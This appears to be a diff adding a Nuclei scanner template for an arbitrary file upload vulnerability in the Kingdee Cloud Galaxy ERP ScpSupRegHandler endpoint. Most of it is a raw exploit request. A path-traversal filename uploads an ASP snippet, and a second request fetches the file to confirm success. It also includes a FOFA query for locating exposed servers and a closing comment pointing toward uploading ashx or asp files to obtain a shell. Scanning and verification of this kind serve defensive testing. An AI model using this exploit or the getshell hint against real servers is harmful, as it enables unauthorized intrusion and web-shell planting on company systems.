@@ -1,0 +1,68 @@
+id: kingdee-erp-ScpSupRegHandler-fileupload
+
+info:
+  name: 金蝶云星空 erp ScpSupRegHandler - fileupload
+  author: Xc1Ym,leadlife
+  severity: critical
+  description: 金蝶云星空是一款云端企业资源管理（ERP）软件，为企业提供财务管理、供应链管理以及业务流程管理等一体化解决方案。金蝶云·星空聚焦多组织，多利润中心的大中型企业，以 “开放、标准、社交”三大特性为数字经济时代的企业提供开放的 ERP 云平台。服务涵盖：财务、供应链、智能制造、阿米巴管理、全渠道营销、电商、HR、企业互联网服务，帮助企业实现数字化营销新生态及管理重构等，提升企业数字化能力。金蝶云星空管理中心存在任意文件上传漏洞。
+  reference:
+    - https://github.com/wy876/POC/blob/61b2bf45a165e027ea7014e0bd153f5bf1108b61/%E9%87%91%E8%9D%B6/%E9%87%91%E8%9D%B6OA%E4%BA%91%E6%98%9F%E7%A9%BA%20ScpSupRegHandler%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+    - https://github.com/adysec/nuclei_poc/blob/d9f176176b7e140a93dfc8e422b0bb3c00812bca/poc/upload/k3cloud_scpsuperghandler_upload.yaml#L21
+    - https://github.com/SleepingBag945/dddd/blob/4c428a7c171275bfbb5fa72c2fb4bd7b48f4ff4a/common/config/pocs/kingdee-scpsupreghandler-upload.yaml#L14
+  metadata:
+    max-request: 6
+    fofa-query: icon_hash="-1629133697" && title=="金蝶云星空"
+    verified: true
+  tags: upload,OA,k3cloud,hw,intrusive,kingdee
+
+variables:
+  filename: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST {{path}}SRM/ScpSupRegHandler HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Cache-Control: max-age=0
+        Content-Length: 405
+        Content-Type: multipart/form-data; boundary=fd18dd968b553715cbc5a1982526199b
+
+        --fd18dd968b553715cbc5a1982526199b
+        Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{filename}}.txt."
+        Content-Type: text/plain
+
+        <% Response.Write("{{randstr}}") %>
+        --fd18dd968b553715cbc5a1982526199b
+        Content-Disposition: form-data; name="FID"
+
+        2022
+        --fd18dd968b553715cbc5a1982526199b
+        Content-Disposition: form-data; name="dbId_v"
+
+        .
+        --fd18dd968b553715cbc5a1982526199b--
+
+      - |
+        GET {{path}}uploadfiles/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      path:
+        - /K3Cloud/
+        - /
+
+    attack: batteringram
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_1, '附件保存成功')
+          - contains(body_2, '{{randstr}}')
+        condition: and
+
+# then test ashx,asp to getshell
